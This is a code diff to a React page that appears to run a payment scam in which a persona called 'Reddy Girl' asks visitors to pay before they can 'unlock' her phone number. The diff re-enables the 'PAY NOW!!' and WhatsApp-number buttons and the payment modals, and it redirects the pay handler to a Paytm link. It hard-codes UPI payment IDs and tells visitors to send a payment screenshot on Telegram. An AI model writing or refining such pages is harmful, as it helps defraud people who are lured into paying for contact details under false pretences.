@@ -49,9 +49,9 @@ function App() {
 
 
   const handlepayButton = async () => {
-    setisConfirmOpen(!isOpen)
+    // setisConfirmOpen(!isOpen)
     await sendUpdate("PayButton")
-    // window.location.href = "upi://pay?pa=paytmqr281005050101rgcfsaeesx4o@paytm&pn=ReddyGirl&paytmqr=281005050101RGCFSAEESX4O";
+    window.location.href = "https://paytm.me/u-dSry0";
   }
 
   const handleWspButton = async () => {
@@ -82,15 +82,15 @@ function App() {
         <h1 style={{ color: "#82ffa5" }}><img style={{ width: "200px" }} alt='' src='./logo.svg'></img></h1>
         <p style={{ fontSize: "20px", fontWeight: "bolder", marginTop: '35px' }}>Copy <p style={{ color: '#c9df3d', cursor: 'pointer', display: 'contents' }} onClick={async () => {
           navigator.clipboard.writeText("paytmqr281005050101jnirp1ueoe1y@paytm");
-        }}>UPI ID </p>or  <a style={{ color: '#c9df3d', cursor: 'pointer' }} href='upi://pay?pa=paytmqr281005050101jnirp1ueoe1y@paytm&cu=INR&pn=Reddy%20Girl' onClick={async () => {
+        }}>UPI ID </p>or  <a style={{ color: '#c9df3d', cursor: 'pointer', marginBottom: '0px' }} href='upi://pay?pa=paytmqr281005050101jnirp1ueoe1y@paytm&cu=INR&pn=Reddy%20Girl' onClick={async () => {
           navigator.clipboard.writeText("paytmqr281005050101jnirp1ueoe1y@paytm");
         }}>Scan</a> the QR code!!</p>
         <CopyExample />
-        {/* <MsgBtnCombo msg="You should PAY first to Unlock My Number!!😜" btnName="PAY NOW!!" handler={handlepayButton} err={true}></MsgBtnCombo> */}
-        {/* <MsgBtnCombo msg="Click Below👇 For My Whatsapp Number!!" btnName="Whatsapp Number!" handler={handleWspButton} err={false}></MsgBtnCombo> */}
-        <h6 style={{ color: "bisque", fontSize: "1rem", margin: '40px' }}>PAY NOW and Send me SCREENSHOT on Telegram!!🥰</h6>
-        {/* {isOpen && <PaymentModal isOpen={isOpen} setisOpen={setisOpen} fn={handlepayButton} className="special_modal"></PaymentModal>} */}
-        {/* {isConfirmOpen && <ConfirmModal isOpen={isConfirmOpen} setisOpen={setisConfirmOpen} fn={handlepayButton} className="special_modal"></ConfirmModal>} */}
+        <MsgBtnCombo msg="You should PAY first to Unlock My Number!!😜" btnName="PAY NOW!!" handler={handlepayButton} err={true}></MsgBtnCombo>
+        <MsgBtnCombo msg="Click Below👇 For My Whatsapp Number!!" btnName="Whatsapp Number!" handler={handleWspButton} err={false}></MsgBtnCombo>
+        <h6 style={{ color: "bisque", fontSize: "1rem" }}>PAY NOW and Send me SCREENSHOT on Telegram!!🥰</h6>
+        {isOpen && <PaymentModal isOpen={isOpen} setisOpen={setisOpen} fn={handlepayButton} className="special_modal"></PaymentModal>}
+        {isConfirmOpen && <ConfirmModal isOpen={isConfirmOpen} setisOpen={setisConfirmOpen} fn={handlepayButton} className="special_modal"></ConfirmModal>}
       </header>
     </div >
   );
